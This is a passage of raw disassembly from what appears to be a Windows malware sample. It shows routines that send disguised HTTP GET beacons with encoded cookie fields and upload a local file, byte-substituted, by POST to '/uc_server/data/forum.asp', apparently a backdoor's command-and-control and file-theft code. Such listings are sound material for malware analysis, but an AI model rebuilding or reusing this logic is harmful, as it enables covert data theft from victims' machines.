                jz      loc_40295A
                mov     ecx, dword_42C8E0
                mov     edx, dword_42C8D8
                mov     esi, [edx+ecx*4]
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_4028E1
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4028E1:                             ; CODE XREF: sub_4027B0+123↑j
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                mov     [esi+4], bl
                mov     eax, dword_42C8E0
                inc     eax
                mov     dword_42C8E0, eax
                cmp     dword_42C8DC, eax
                ja      short loc_402908
                xor     eax, eax
                mov     dword_42C8E0, eax

loc_402908:                             ; CODE XREF: sub_4027B0+14F↑j
                mov     ecx, dword_42C8E4
                sub     ecx, 1
                mov     dword_42C8E4, ecx
                jnz     short loc_40295F
                mov     dword_42C8E0, ebx

loc_40291F:                             ; CODE XREF: sub_4027B0+1B7↓j
                mov     esi, ds:WaitForSingleObject

loc_402925:                             ; CODE XREF: sub_4027B0+87↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                xor     eax, eax
                cmp     [esp+40h+var_18], ebx
                setnz   al
                cmp     eax, ebx
                jnz     short loc_402969
                push    0FA0h           ; dwMilliseconds
                call    ebp ; Sleep
                mov     [esp+40h+var_4], 0FFFFFFFFh
                cmp     [esp+40h+var_14], 10h
                jb      short loc_4029C1
                mov     eax, [esp+40h+var_28]
                push    eax
                jmp     short loc_4029B9
; ---------------------------------------------------------------------------

loc_40295A:                             ; CODE XREF: sub_4027B0+10A↑j
                mov     eax, dword_42C8E0

loc_40295F:                             ; CODE XREF: sub_4027B0+167↑j
                cmp     ecx, ebx
                ja      loc_402842
                jmp     short loc_40291F
; ---------------------------------------------------------------------------

loc_402969:                             ; CODE XREF: sub_4027B0+18B↑j
                mov     ecx, hEvent
                push    ebx             ; dwMilliseconds
                push    ecx             ; hHandle
                call    esi ; WaitForSingleObject
                test    eax, eax
                jz      short loc_4029A5
                jmp     short loc_402980
; ---------------------------------------------------------------------------
                align 10h

loc_402980:                             ; CODE XREF: sub_4027B0+1C7↑j
                                        ; sub_4027B0+1F3↓j
                lea     edx, [esp+40h+var_2C]
                push    edx
                call    sub_404940
                add     esp, 4
                test    eax, eax
                jnz     short loc_4029A5
                push    0FA0h           ; dwMilliseconds
                call    ebp ; Sleep
                mov     eax, hEvent
                push    ebx             ; dwMilliseconds
                push    eax             ; hHandle
                call    esi ; WaitForSingleObject
                test    eax, eax
                jnz     short loc_402980

loc_4029A5:                             ; CODE XREF: sub_4027B0+1C5↑j
                                        ; sub_4027B0+1DF↑j
                mov     [esp+40h+var_4], 0FFFFFFFFh
                cmp     [esp+40h+var_14], 10h
                jb      short loc_4029C1
                mov     ecx, [esp+40h+var_28]
                push    ecx

loc_4029B9:                             ; CODE XREF: sub_4027B0+1A8↑j
                call    sub_40F15B
                add     esp, 4

loc_4029C1:                             ; CODE XREF: sub_4027B0+1A1↑j
                                        ; sub_4027B0+202↑j
                mov     edx, hEvent
                push    ebx             ; dwMilliseconds
                push    edx             ; hHandle
                call    esi ; WaitForSingleObject
                test    eax, eax
                jnz     loc_402801

loc_4029D3:                             ; CODE XREF: sub_4027B0+45↑j
                xor     eax, eax
                mov     ecx, [esp+40h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+2Ch+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2Ch
                retn    4
sub_4027B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_402A00      proc near               ; DATA XREF: sub_4059A0+266↓o

var_1A5C        = dword ptr -1A5Ch
var_1A58        = dword ptr -1A58h
var_1A54        = dword ptr -1A54h
Buffer          = dword ptr -1A50h
var_1A4C        = byte ptr -1A4Ch
var_1A48        = dword ptr -1A48h
var_1A38        = dword ptr -1A38h
var_1A34        = dword ptr -1A34h
var_1A30        = byte ptr -1A30h
var_1A2C        = dword ptr -1A2Ch
var_1A1C        = dword ptr -1A1Ch
var_1A18        = dword ptr -1A18h
var_1A14        = byte ptr -1A14h
var_1A13        = byte ptr -1A13h
var_1814        = byte ptr -1814h
var_1813        = byte ptr -1813h
szObjectName    = byte ptr -1414h
var_1413        = byte ptr -1413h
var_1014        = byte ptr -1014h
var_1013        = byte ptr -1013h
var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_402A00
                mov     eax, large fs:0
                push    eax
                mov     eax, 1A50h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+1A5Ch+var_14], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+1A70h+var_C]
                mov     large fs:0, eax
                mov     ebp, dword_42C7A8
                xor     ebx, ebx
                push    3FFh
                lea     eax, [esp+1A74h+var_1413]
                push    ebx
                push    eax
                mov     [esp+1A7Ch+var_1A5C], ebp
                mov     [esp+1A7Ch+szObjectName], bl
                call    sub_413520
                add     esp, 0Ch
                push    1FFh
                lea     ecx, [esp+1A74h+var_1A13]
                push    ebx
                push    ecx
                mov     [esp+1A7Ch+var_1A14], bl
                call    sub_413520
                add     esp, 0Ch
                xor     eax, eax

loc_402A81:                             ; CODE XREF: sub_402A00+8E↓j
                mov     cl, byte_42B784[eax]
                mov     [esp+eax+1A70h+var_1A14], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_402A81
                push    ebx
                mov     edi, 0Fh
                push    offset szProxyBypass
                lea     ecx, [esp+1A78h+var_1A30]
                mov     [esp+1A78h+var_1A18], edi
                mov     [esp+1A78h+var_1A1C], ebx
                mov     byte ptr [esp+1A78h+var_1A2C], bl
                call    sub_409840
                push    0FFFh
                lea     edx, [esp+1A74h+var_1013]
                push    ebx
                mov     [esp+1A78h+var_4], ebx
                push    edx
                mov     [esp+1A7Ch+var_1014], bl
                call    sub_413520
                mov     eax, offset dword_42C368
                add     esp, 0Ch
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_402AE0:                             ; CODE XREF: sub_402A00+E5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402AE0
                sub     eax, edx
                lea     ecx, [esp+1A70h+var_1014]
                push    offset dword_42C368
                push    ecx
                mov     esi, eax
                call    sub_404660
                add     esp, 8
                cmp     [esp+1A70h+var_1A1C], ebx
                jz      short loc_402B13
                mov     bl, 3Bh
                lea     esi, [esp+1A70h+var_1A30]
                call    sub_408C10
                xor     ebx, ebx

loc_402B13:                             ; CODE XREF: sub_402A00+104↑j
                push    4
                push    offset aClip    ; "CLIP"
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                lea     eax, [esp+1A70h+var_1014]
                lea     edx, [eax+1]
                lea     ecx, [ecx+0]

loc_402B40:                             ; CODE XREF: sub_402A00+145↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402B40
                sub     eax, edx
                push    eax
                lea     edx, [esp+1A74h+var_1014]
                push    edx
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+1A78h+var_1A4C]
                mov     [esp+1A78h+var_1A34], edi
                mov     [esp+1A78h+var_1A38], ebx
                mov     byte ptr [esp+1A78h+var_1A48], bl
                call    sub_409840
                mov     byte ptr [esp+1A70h+var_4], 1
                cmp     [esp+1A70h+var_1A38], ebx
                jz      short loc_402B91
                mov     bl, 3Bh
                lea     esi, [esp+1A70h+var_1A4C]
                call    sub_408C10
                xor     ebx, ebx

loc_402B91:                             ; CODE XREF: sub_402A00+182↑j
                push    2
                push    offset aSf      ; "sf"
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                mov     eax, offset byte_42B580
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_402BC0:                             ; CODE XREF: sub_402A00+1C5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402BC0
                sub     eax, edx
                push    eax
                push    offset byte_42B580
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                cmp     [esp+1A70h+var_1A38], ebx
                jz      short loc_402BEB
                mov     bl, 3Bh
                lea     esi, [esp+1A70h+var_1A4C]
                call    sub_408C10
                xor     ebx, ebx

loc_402BEB:                             ; CODE XREF: sub_402A00+1DC↑j
                push    2
                push    offset aCf      ; "cf"
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                mov     eax, offset byte_42B784
                lea     edx, [eax+1]

loc_402C13:                             ; CODE XREF: sub_402A00+218↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402C13
                sub     eax, edx
                push    eax
                push    offset byte_42B784
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                mov     ecx, dword_42B780
                mov     edi, offset aSfl ; "sfl"
                lea     edx, [esp+1A70h+var_1A4C]
                call    sub_4045C0
                mov     ecx, dword_42B984
                mov     edi, offset aCfl ; "cfl"
                lea     edx, [esp+1A70h+var_1A4C]
                call    sub_4045C0
                cmp     [esp+1A70h+var_1A38], ebx
                jz      short loc_402C66
                mov     bl, 3Bh
                lea     esi, [esp+1A70h+var_1A4C]
                call    sub_408C10
                xor     ebx, ebx

loc_402C66:                             ; CODE XREF: sub_402A00+257↑j
                push    5
                push    offset aDummy   ; "dummy"
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                push    ebx
                push    offset szProxyBypass
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                push    408h
                push    ebx
                push    offset byte_42B580
                call    sub_413520
                mov     esi, [esp+1A7Ch+var_1A38]
                mov     eax, 0AAAAAAABh
                mul     esi
                shr     edx, 1
                lea     eax, [edx+edx*2]
                mov     ecx, esi
                sub     ecx, eax
                add     esp, 0Ch
                cmp     ecx, 1
                jnz     short loc_402CD5
                push    2
                push    offset aSy      ; "sy"
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                mov     esi, [esp+1A70h+var_1A38]

loc_402CD5:                             ; CODE XREF: sub_402A00+2BF↑j
                mov     eax, 0AAAAAAABh
                mul     esi
                shr     edx, 1
                lea     edx, [edx+edx*2]
                mov     eax, esi
                sub     eax, edx
                cmp     eax, 2
                jnz     short loc_402CFE
                push    1
                push    offset aS       ; "s"
                lea     eax, [esp+1A78h+var_1A4C]
                call    sub_409730
                mov     esi, [esp+1A70h+var_1A38]

loc_402CFE:                             ; CODE XREF: sub_402A00+2E8↑j
                push    3FFh
                lea     ecx, [esp+1A74h+var_1813]
                push    ebx
                push    ecx
                mov     [esp+1A7Ch+var_1814], bl
                call    sub_413520
                mov     eax, [esp+1A7Ch+var_1A48]
                add     esp, 0Ch
                cmp     [esp+1A70h+var_1A34], 10h
                jnb     short loc_402D2A
                lea     eax, [esp+1A70h+var_1A48]

loc_402D2A:                             ; CODE XREF: sub_402A00+324↑j
                push    eax
                lea     edx, [esp+1A74h+var_1814]
                push    edx
                call    sub_404660
                add     esp, 8
                cmp     [esp+1A70h+var_1A1C], ebx
                jz      short loc_402D4E
                mov     bl, 3Bh
                lea     esi, [esp+1A70h+var_1A30]
                call    sub_408C10
                xor     ebx, ebx

loc_402D4E:                             ; CODE XREF: sub_402A00+33F↑j
                push    4
                push    offset aMuid    ; "MUID"
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                lea     eax, [esp+1A70h+var_1814]
                lea     edx, [eax+1]

loc_402D78:                             ; CODE XREF: sub_402A00+37D↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_402D78
                sub     eax, edx
                push    eax
                lea     eax, [esp+1A74h+var_1814]
                push    eax
                lea     eax, [esp+1A78h+var_1A30]
                call    sub_409730
                lea     ecx, [esp+1A70h+szObjectName]
                push    400h
                push    ecx
                call    sub_403B80
                add     esp, 8
                cmp     dword_42C344, ebx
                jz      short loc_402DC9
                push    1               ; int
                lea     eax, [esp+1A74h+szObjectName]
                mov     ecx, offset szVerb ; "GET"
                mov     edx, ebp
                call    sub_40DFC0
                mov     esi, eax
                jmp     short loc_402E46
; ---------------------------------------------------------------------------

loc_402DC9:                             ; CODE XREF: sub_402A00+3AE↑j
                mov     eax, [esp+1A70h+var_1A5C]
                mov     ecx, [eax+8]
                push    ebx             ; dwContext
                push    84080000h       ; dwFlags
                push    ebx             ; lplpszAcceptTypes
                push    ebx             ; lpszReferrer
                push    offset szVersion ; "HTTP/1.0"
                lea     edx, [esp+1A84h+szObjectName]
                push    edx             ; lpszObjectName
                push    offset szVerb   ; "GET"
                or      ebp, 0FFFFFFFFh
                push    ecx             ; hConnect
                mov     [esp+1A90h+var_1A58], ebp
                mov     [esp+1A90h+var_1A54], ebp
                call    ds:HttpOpenRequestA
                mov     esi, eax
                cmp     esi, ebx
                jz      short loc_402E44
                mov     edi, ds:InternetSetOptionA
                push    4               ; dwBufferLength
                lea     edx, [esp+1A74h+Buffer]
                push    edx             ; lpBuffer
                push    41h             ; dwOption
                push    esi             ; hInternet
                mov     [esp+1A80h+Buffer], ebx
                call    edi ; InternetSetOptionA
                cmp     [esp+1A70h+var_1A58], ebp
                jz      short loc_402E2E
                push    4               ; dwBufferLength
                lea     eax, [esp+1A74h+var_1A58]
                push    eax             ; lpBuffer
                push    6               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jz      short loc_402E44

loc_402E2E:                             ; CODE XREF: sub_402A00+41C↑j
                cmp     [esp+1A70h+var_1A54], ebp
                jz      short loc_402E46
                push    4               ; dwBufferLength
                lea     ecx, [esp+1A74h+var_1A54]
                push    ecx             ; lpBuffer
                push    5               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jnz     short loc_402E46

loc_402E44:                             ; CODE XREF: sub_402A00+400↑j
                                        ; sub_402A00+42C↑j
                xor     esi, esi

loc_402E46:                             ; CODE XREF: sub_402A00+3C7↑j
                                        ; sub_402A00+432↑j ...
                mov     ebx, offset aX86 ; "x86"
                mov     edi, offset aUaCpu ; "UA-CPU"
                call    sub_40E0B0
                mov     ebx, offset aTextHtmlQ09Tex ; "text/html;q=0.9,text/plain;q=0.8,applic"...
                mov     edi, offset aAccept ; "Accept"
                call    sub_40E0B0
                mov     ebx, offset aEnUs ; "en-us"
                mov     edi, offset aAcceptLanguage ; "Accept-Language"
                call    sub_40E0B0
                mov     ebx, offset aGzipQ08Deflate ; "gzip;q=0.8, deflate;q=0.5"
                mov     edi, offset aAcceptEncoding ; "Accept-Encoding"
                call    sub_40E0B0
                mov     ebx, [esp+1A70h+var_1A2C]
                mov     ebp, 10h
                cmp     [esp+1A70h+var_1A18], ebp
                jnb     short loc_402E95
                lea     ebx, [esp+1A70h+var_1A2C]

loc_402E95:                             ; CODE XREF: sub_402A00+48F↑j
                mov     edi, offset aCookie ; "Cookie"
                call    sub_40E0B0
                xor     ebx, ebx
                push    ebx             ; dwOptionalLength
                push    ebx             ; lpOptional
                push    ebx             ; dwHeadersLength
                push    ebx             ; lpszHeaders
                push    esi             ; hRequest
                call    ds:HttpSendRequestA
                test    eax, eax
                jnz     short loc_402EBE
                call    ds:GetLastError
                mov     edx, [esp+1A70h+var_1A5C]
                mov     [edx], eax
                jmp     short loc_402ED1
; ---------------------------------------------------------------------------

loc_402EBE:                             ; CODE XREF: sub_402A00+4AE↑j
                mov     eax, [esp+1A70h+var_1A5C]
                push    eax
                lea     ecx, [esp+1A74h+var_1A14]
                mov     edi, esi
                call    sub_404BF0
                add     esp, 4

loc_402ED1:                             ; CODE XREF: sub_402A00+4BC↑j
                cmp     esi, ebx
                jz      short loc_402EDC
                push    esi             ; hInternet
                call    ds:InternetCloseHandle

loc_402EDC:                             ; CODE XREF: sub_402A00+4D3↑j
                cmp     [esp+1A70h+var_1A34], ebp
                jb      short loc_402EEF
                mov     ecx, [esp+1A70h+var_1A48]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_402EEF:                             ; CODE XREF: sub_402A00+4E0↑j
                mov     [esp+1A70h+var_1A34], 0Fh
                mov     [esp+1A70h+var_1A38], ebx
                mov     byte ptr [esp+1A70h+var_1A48], bl
                cmp     [esp+1A70h+var_1A18], ebp
                jb      short loc_402F12
                mov     edx, [esp+1A70h+var_1A2C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_402F12:                             ; CODE XREF: sub_402A00+503↑j
                xor     eax, eax
                mov     ecx, [esp+1A70h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+1A5Ch+var_14]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 1A5Ch
                retn    4
sub_402A00      endp

; ---------------------------------------------------------------------------
                align 10h

loc_402F40:                             ; DATA XREF: sub_405C60+246↓o
                push    0FFFFFFFFh
                push    offset sub_41EE36
                mov     eax, large fs:0
                push    eax
                mov     eax, 4E68h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+4E60h], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+4E7Ch]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    1FFh
                lea     eax, [esp+79h]
                push    ebx
                push    eax
                mov     [esp+80h], bl
                call    sub_413520
                add     esp, 0Ch
                xor     eax, eax
                lea     ecx, [ecx+0]

loc_402FA0:                             ; CODE XREF: .text:00402FAD↓j
                mov     cl, byte_42BB8C[eax]
                mov     [esp+eax+74h], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_402FA0
                xor     eax, eax

loc_402FB1:                             ; CODE XREF: .text:00402FC1↓j
                mov     cl, byte_42B988[eax]
                mov     [esp+eax+274h], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_402FB1
                mov     ecx, dword_42BB88
                push    ebx
                mov     [esp+20h], ecx
                mov     esi, 0Fh
                push    offset szProxyBypass
                lea     ecx, [esp+60h]
                mov     [esp+78h], esi
                mov     [esp+74h], ebx
                mov     [esp+64h], bl
                call    sub_409840
                mov     [esp+4E84h], ebx
                push    ebx
                push    offset szProxyBypass
                lea     ecx, [esp+44h]
                mov     [esp+5Ch], esi
                mov     [esp+58h], ebx
                mov     [esp+48h], bl
                call    sub_409840
                mov     byte ptr [esp+4E84h], 1
                cmp     [esp+50h], ebx
                jz      short loc_40302A
                mov     bl, 3Bh
                lea     esi, [esp+3Ch]
                call    sub_408C10
                xor     ebx, ebx

loc_40302A:                             ; CODE XREF: .text:0040301B↑j
                push    2
                push    offset aSf      ; "sf"
                lea     eax, [esp+44h]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+44h]
                call    sub_409730
                mov     eax, offset byte_42B988
                lea     edx, [eax+1]

loc_403052:                             ; CODE XREF: .text:00403057↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_403052
                sub     eax, edx
                push    eax
                push    offset byte_42B988
                lea     eax, [esp+44h]
                call    sub_409730
                cmp     [esp+50h], ebx
                jz      short loc_40307D
                mov     bl, 3Bh
                lea     esi, [esp+3Ch]
                call    sub_408C10
                xor     ebx, ebx

loc_40307D:                             ; CODE XREF: .text:0040306E↑j
                push    2
                push    offset aCf      ; "cf"
                lea     eax, [esp+44h]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+44h]
                call    sub_409730
                mov     eax, offset byte_42BB8C
                lea     edx, [eax+1]

loc_4030A5:                             ; CODE XREF: .text:004030AA↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4030A5
                sub     eax, edx
                push    eax
                push    offset byte_42BB8C
                lea     eax, [esp+44h]
                call    sub_409730
                mov     ecx, dword_42BB88
                mov     edi, offset aSfl ; "sfl"
                lea     edx, [esp+3Ch]
                call    sub_4045C0
                mov     ecx, dword_42BD8C
                mov     edi, offset aCfl ; "cfl"
                lea     edx, [esp+3Ch]
                call    sub_4045C0
                cmp     [esp+50h], ebx
                jz      short loc_4030F8
                mov     bl, 3Bh
                lea     esi, [esp+3Ch]
                call    sub_408C10
                xor     ebx, ebx

loc_4030F8:                             ; CODE XREF: .text:004030E9↑j
                push    5
                push    offset aDummy   ; "dummy"
                lea     eax, [esp+44h]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+44h]
                call    sub_409730
                push    ebx
                push    offset szProxyBypass
                lea     eax, [esp+44h]
                call    sub_409730
                push    408h
                push    ebx
                push    offset byte_42B988
                call    sub_413520
                mov     esi, [esp+5Ch]
                mov     eax, 0AAAAAAABh
                mul     esi
                shr     edx, 1
                lea     edx, [edx+edx*2]
                mov     eax, esi
                sub     eax, edx
                add     esp, 0Ch
                cmp     eax, 1
                jnz     short loc_403167
                push    2
                push    offset aSy      ; "sy"
                lea     eax, [esp+44h]
                call    sub_409730
                mov     esi, [esp+50h]

loc_403167:                             ; CODE XREF: .text:00403151↑j
                mov     eax, 0AAAAAAABh
                mul     esi
                shr     edx, 1
                lea     ecx, [edx+edx*2]
                mov     edx, esi
                sub     edx, ecx
                cmp     edx, 2
                jnz     short loc_403190
                push    1
                push    offset aS       ; "s"
                lea     eax, [esp+44h]
                call    sub_409730
                mov     esi, [esp+50h]

loc_403190:                             ; CODE XREF: .text:0040317A↑j
                push    3FFh
                lea     eax, [esp+279h]
                push    ebx
                push    eax
                mov     [esp+280h], bl
                call    sub_413520
                mov     eax, [esp+4Ch]
                add     esp, 0Ch
                cmp     dword ptr [esp+54h], 10h
                jnb     short loc_4031BC
                lea     eax, [esp+40h]

loc_4031BC:                             ; CODE XREF: .text:004031B6↑j
                push    eax
                lea     ecx, [esp+278h]
                push    ecx
                call    sub_404660
                add     esp, 8
                cmp     [esp+6Ch], ebx
                jz      short loc_4031E0
                mov     bl, 3Bh
                lea     esi, [esp+58h]
                call    sub_408C10
                xor     ebx, ebx

loc_4031E0:                             ; CODE XREF: .text:004031D1↑j
                push    4
                push    offset aMuid    ; "MUID"
                lea     eax, [esp+60h]
                call    sub_409730
                push    1
                push    offset asc_422334 ; "="
                lea     eax, [esp+60h]
                call    sub_409730
                lea     eax, [esp+274h]
                lea     edx, [eax+1]
                lea     ebx, [ebx+0]

loc_403210:                             ; CODE XREF: .text:00403215↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_403210
                sub     eax, edx
                push    eax
                lea     edx, [esp+278h]
                push    edx
                lea     eax, [esp+60h]
                call    sub_409730
                mov     edx, dword_42C7A8
                mov     [esp+24h], edx
                cmp     dword_42C344, ebx
                jz      short loc_403252
                push    1
                mov     eax, offset aUcServerDataFo ; "/uc_server/data/forum.asp"
                mov     ecx, offset aPost ; "POST"
                call    sub_40DFC0
                mov     ebp, eax
                jmp     short loc_4032C8
; ---------------------------------------------------------------------------

loc_403252:                             ; CODE XREF: .text:0040323B↑j
                mov     eax, [edx+8]
                push    ebx
                push    84080000h
                push    ebx
                push    ebx
                push    offset szVersion ; "HTTP/1.0"
                push    offset aUcServerDataFo ; "/uc_server/data/forum.asp"
                push    offset aPost    ; "POST"
                or      edi, 0FFFFFFFFh
                push    eax
                mov     [esp+4Ch], edi
                mov     [esp+54h], edi
                call    ds:HttpOpenRequestA
                mov     ebp, eax
                cmp     ebp, ebx
                jz      short loc_4032C6
                mov     esi, ds:InternetSetOptionA
                push    4
                lea     ecx, [esp+1Ch]
                push    ecx
                push    41h
                push    ebp
                mov     [esp+28h], ebx
                call    esi ; InternetSetOptionA
                cmp     [esp+2Ch], edi
                jz      short loc_4032B0
                push    4
                lea     edx, [esp+30h]
                push    edx
                push    6
                push    ebp
                call    esi ; InternetSetOptionA
                test    eax, eax
                jz      short loc_4032C6

loc_4032B0:                             ; CODE XREF: .text:0040329E↑j
                cmp     [esp+34h], edi
                jz      short loc_4032C8
                push    4
                lea     eax, [esp+38h]
                push    eax
                push    5
                push    ebp
                call    esi ; InternetSetOptionA
                test    eax, eax
                jnz     short loc_4032C8

loc_4032C6:                             ; CODE XREF: .text:00403282↑j
                                        ; .text:004032AE↑j
                xor     ebp, ebp

loc_4032C8:                             ; CODE XREF: .text:00403250↑j
                                        ; .text:004032B4↑j ...
                mov     ebx, offset aX86 ; "x86"
                mov     edi, offset aUaCpu ; "UA-CPU"
                mov     esi, ebp
                call    sub_40E0B0
                mov     ebx, offset aTextHtmlQ09Tex ; "text/html;q=0.9,text/plain;q=0.8,applic"...
                mov     edi, offset aAccept ; "Accept"
                call    sub_40E0B0
                mov     ebx, offset aEnUs ; "en-us"
                mov     edi, offset aAcceptLanguage ; "Accept-Language"
                call    sub_40E0B0
                mov     ebx, offset aGzipQ08Deflate ; "gzip;q=0.8, deflate;q=0.5"
                mov     edi, offset aAcceptEncoding ; "Accept-Encoding"
                call    sub_40E0B0
                cmp     dword ptr [esp+70h], 10h
                mov     ebx, [esp+5Ch]
                jnb     short loc_403315
                lea     ebx, [esp+5Ch]

loc_403315:                             ; CODE XREF: .text:0040330F↑j
                mov     edi, offset aCookie ; "Cookie"
                mov     esi, ebp
                call    sub_40E0B0
                mov     ebx, offset aMultipartFormD ; "multipart/form-data; boundary=---------"...
                mov     edi, offset aContentType ; "Content-Type"
                call    sub_40E0B0
                lea     ecx, [esp+74h]
                push    offset aRb      ; "rb"
                push    ecx
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                test    esi, esi
                jnz     short loc_40334D
                or      eax, 0FFFFFFFFh
                jmp     short loc_40336A
; ---------------------------------------------------------------------------

loc_40334D:                             ; CODE XREF: .text:00403346↑j
                push    2
                push    0
                push    esi
                call    sub_40F65C
                push    esi
                call    sub_40F564
                push    esi
                mov     edi, eax
                call    sub_40F867
                add     esp, 14h
                mov     eax, edi

loc_40336A:                             ; CODE XREF: .text:0040334B↑j
                mov     esi, [esp+1Ch]
                sub     eax, esi
                push    eax
                mov     edx, ebp
                call    sub_40E120
                test    eax, eax
                jz      loc_4035B2
                lea     edx, [esp+74h]
                push    offset aRb      ; "rb"
                push    edx
                call    sub_40ED4E
                mov     ebx, eax
                add     esp, 8
                test    ebx, ebx
                jz      loc_4035B2
                push    0
                push    esi
                push    ebx
                call    sub_40F65C
                push    1FFFh
                lea     eax, [esp+685h]
                push    0
                push    eax
                mov     byte ptr [esp+68Ch], 0
                call    sub_413520
                push    ebx
                mov     dword ptr [esp+4Ch], 0
                call    sub_40E3F9
                add     esp, 1Ch
                test    eax, eax
                jnz     loc_403484

loc_4033DA:                             ; CODE XREF: .text:0040347E↓j
                mov     ecx, hEvent
                push    0
                push    ecx
                call    ds:WaitForSingleObject
                test    eax, eax
                jz      loc_403484
                push    ebx
                push    2000h
                lea     edx, [esp+67Ch]
                push    1
                push    edx
                call    sub_40F10A
                push    ebx
                mov     edi, eax
                call    sub_40E42D
                add     esp, 14h
                test    eax, eax
                jnz     loc_40358D
                test    edi, edi
                jle     short loc_40343A
                lea     ecx, [ecx+0]

loc_403420:                             ; CODE XREF: .text:00403438↓j
                movzx   ecx, byte ptr [esp+eax+674h]
                mov     dl, byte_426610[ecx]
                mov     [esp+eax+674h], dl
                inc     eax
                cmp     eax, edi
                jl      short loc_403420

loc_40343A:                             ; CODE XREF: .text:0040341B↑j
                lea     esi, [esp+674h]
                test    edi, edi
                jbe     short loc_403473

loc_403445:                             ; CODE XREF: .text:00403471↓j
                lea     eax, [esp+30h]
                push    eax
                push    edi
                push    esi
                push    ebp
                call    ds:InternetWriteFile
                test    eax, eax
                jz      loc_40358D
                mov     eax, [esp+30h]
                test    eax, eax
                jz      short loc_403473
                push    64h
                add     esi, eax
                sub     edi, eax
                call    ds:Sleep
                test    edi, edi
                ja      short loc_403445

loc_403473:                             ; CODE XREF: .text:00403443↑j
                                        ; .text:00403461↑j
                push    ebx
                call    sub_40E3F9
                add     esp, 4
                test    eax, eax
                jz      loc_4033DA

loc_403484:                             ; CODE XREF: .text:004033D4↑j
                                        ; .text:004033EB↑j
                push    ebx
                call    sub_40F867
                add     esp, 4
                push    0
                push    0
                push    0
                push    ebp
                call    ds:HttpEndRequestA
                test    eax, eax
                jnz     short loc_4034AA
                call    ds:GetLastError
                mov     ecx, [esp+24h]
                mov     [ecx], eax

loc_4034AA:                             ; CODE XREF: .text:0040349C↑j
                mov     ebx, 4
                mov     dword ptr [esp+1Ch], 0
                mov     [esp+18h], ebx
                test    ebp, ebp
                jz      loc_4035BD
                mov     edi, ds:HttpQueryInfoA
                lea     edx, [esp+1Ch]
                push    edx
                lea     eax, [esp+1Ch]
                push    eax
                lea     ecx, [esp+40h]
                push    ecx
                push    20000013h
                push    ebp
                call    edi ; HttpQueryInfoA
                test    eax, eax
                jz      loc_4035B2
                cmp     dword ptr [esp+38h], 0C8h
                jnz     loc_4035B2
                xor     esi, esi
                push    27FFh
                lea     edx, [esp+2679h]
                push    esi
                push    edx
                mov     [esp+34h], esi
                mov     byte ptr [esp+2680h], 0
                call    sub_413520
                xor     eax, eax
